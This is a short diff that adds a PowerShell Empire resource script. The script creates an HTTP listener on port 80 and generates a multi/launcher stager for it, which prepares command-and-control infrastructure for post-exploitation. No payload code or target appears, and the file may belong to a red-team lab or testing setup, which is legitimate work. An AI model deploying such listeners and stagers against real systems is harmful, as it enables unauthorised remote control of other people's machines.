@@ -1,0 +1,12 @@
+# Setup listeners
+listeners
+uselistener http
+set Name http80
+set Port 80
+execute
+
+# Setup Powershell Empire stager
+back
+usestager multi/launcher
+set Listener http80
+execute
